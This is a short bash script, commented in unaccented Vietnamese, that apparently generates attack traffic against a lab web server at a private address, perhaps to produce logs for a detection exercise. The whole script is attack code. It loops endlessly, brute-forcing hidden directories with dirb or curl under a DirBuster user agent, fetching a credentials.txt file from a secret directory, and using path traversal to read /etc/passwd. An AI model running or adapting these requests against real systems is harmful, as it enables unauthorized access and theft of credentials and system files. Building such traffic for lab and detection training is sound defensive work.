#!/bin/bash
# Tan cong: Quet thu muc an (dirb / wordlist) sinh hang loat loi 404,
# ket hop truy cap trai phep thu muc nhay cam /secret_SECID/ (200 OK)
# va khai thac Path Traversal (/view.php?file=../../../../etc/passwd).

TARGET="172.20.0.10"
SECRET_DIR="secret_SECID"
FAKE_DIRS="admin backup config db hidden private logs old test tmp uploads api v1 v2 portal secret .git .env"

# Cho dich vu Web cua target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/80" 2>/dev/null && break
  sleep 2
done

# Tao mini wordlist cho dirb quet nhanh va lien tuc
cat > /tmp/mini_wordlist.txt <<EOF
admin
backup
config
db
hidden
private
logs
old
test
tmp
uploads
${SECRET_DIR}
EOF

# Vong lap tan cong tu dong
while true; do
  # 1. Chay dirb quet thu muc (sinh log 404 + phat hien 200 tren secret_SECID)
  if command -v dirb >/dev/null 2>&1; then
    dirb "http://${TARGET}/" /tmp/mini_wordlist.txt -S -w >/dev/null 2>&1
  else
    for d in $FAKE_DIRS; do
      curl -s -A "DirBuster-1.0-RC1" "http://${TARGET}/${d}/" >/dev/null 2>&1
    done
  fi

  # 2. Truy cap truc tiep file nhay cam trong thu muc secret_SECID
  curl -s "http://${TARGET}/${SECRET_DIR}/credentials.txt" >/dev/null 2>&1

  # 3. Khai thac lo hong Path Traversal doc /etc/passwd
  curl -s --path-as-is "http://${TARGET}/view.php?file=../../../../etc/passwd" >/dev/null 2>&1
  curl -s --path-as-is "http://${TARGET}/../../../../etc/passwd" >/dev/null 2>&1

  sleep 10
done
